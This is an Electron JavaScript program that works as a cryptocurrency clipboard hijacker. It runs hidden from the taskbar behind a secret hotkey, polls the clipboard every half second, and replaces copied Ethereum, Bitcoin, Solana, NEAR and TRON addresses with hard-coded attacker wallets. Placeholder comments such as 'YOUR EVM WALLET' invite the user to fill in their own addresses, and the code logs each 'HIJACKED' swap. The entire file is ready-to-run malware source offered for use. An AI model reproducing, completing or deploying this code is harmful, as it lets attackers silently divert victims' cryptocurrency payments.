const { app, BrowserWindow, globalShortcut, clipboard, ipcMain } = require('electron');
const path = require('path');

let mainWindow;
const ATTACKER_WALLET = {
    ethereum: '0x742d35Cc66DCeC8B01C4e403128ef5451a5b3C10',  // YOUR EVM WALLET
    bitcoin: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',     // YOUR BTC
    solana: '9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM',     // YOUR SOL
    near: 'wallet.hijacker.testnet',                             // YOUR NEAR
    tron: 'TQQm8R5CZV9VJnV7T2qnrD8U9e7bY9gJ3G'                    // YOUR TRON
};

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        show: false,  // Hidden by default (stealth)
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true
        }
    });

    mainWindow.loadFile('index.html');
    
    // Stealth mode - no dock icon, no menu
    mainWindow.setMenuBarVisibility(false);
    mainWindow.setSkipTaskbar(true);
    mainWindow.hide();
}

app.whenReady().then(() => {
    createWindow();
    
    // Global hotkey to show (Ctrl+Alt+H)
    globalShortcut.register('CommandOrControl+Alt+H', () => {
        mainWindow.show();
    });
    
    // Start clipboard monitoring
    setInterval(checkClipboard, 500);  // Check every 500ms
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});

let lastClipboard = '';
function checkClipboard() {
    try {
        const current = clipboard.readText();
        if (current !== lastClipboard && isWalletAddress(current)) {
            const replaced = replaceWalletAddress(current);
            if (replaced !== current) {
                clipboard.writeText(replaced);
                console.log(`💰 HIJACKED: ${current.slice(0,20)}... → ${replaced.slice(0,20)}...`);
                mainWindow.webContents.send('hijack', { original: current, replaced: replaced });
            }
        }
        lastClipboard = current;
    } catch(e) {}
}

function isWalletAddress(text) {
    const patterns = [
        // EVM (ETH, BSC, Polygon, etc.)
        /^0x[a-fA-F0-9]{40}$/,
        // Bitcoin (various formats)
        /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
        // Solana
        /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
        // NEAR
        /^[a-z0-9_-]{2,64}\.(near|testnet|mainnet)$/,
        // TRON
        /^T[a-zA-Z0-9]{33}$/,
        // Monero
        /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/,
        // TON
        /^EQ[a-zA-Z0-9_-]{36,48}$/
    ];
    
    return patterns.some(pattern => pattern.test(text.trim()));
}

function replaceWalletAddress(address) {
    address = address.trim();
    
    // EVM addresses
    if (/^0x[a-fA-F0-9]{40}$/i.test(address)) {
        return ATTACKER_WALLET.ethereum;
    }
    // Bitcoin
    else if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(address)) {
        return ATTACKER_WALLET.bitcoin;
    }
    // Solana
    else if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
        return ATTACKER_WALLET.solana;
    }
    // NEAR
    else if (/^[a-z0-9_-]{2,64}\.(near|testnet|mainnet)$/.test(address)) {
        return ATTACKER_WALLET.near;
    }
    // TRON
    else if (/^T[a-zA-Z0-9]{33}$/.test(address)) {
        return ATTACKER_WALLET.tron;
    }
    
    return address;  // Return original if no match
}


